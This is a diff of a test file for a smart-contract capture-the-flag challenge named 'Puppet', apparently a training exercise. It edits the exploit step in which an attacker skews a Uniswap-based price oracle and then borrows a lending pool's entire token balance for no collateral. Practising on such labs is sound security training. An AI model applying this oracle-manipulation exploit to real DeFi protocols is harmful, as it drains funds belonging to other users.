@@ -93,7 +93,7 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
-        await this.token.transfer(this.uniswapExchange.address, ether('10'), { from: attacker });
+        await this.token.transfer(this.uniswapExchange.address, '1', { from: attacker });
         await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {from: attacker, value: ether('0')});
 
         await this.token.approve(
@@ -112,7 +112,6 @@ describe('[Challenge] Puppet', function () {
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
         // Attacker has stolen all tokens from the pool
         expect(
             await this.token.balanceOf(attacker)
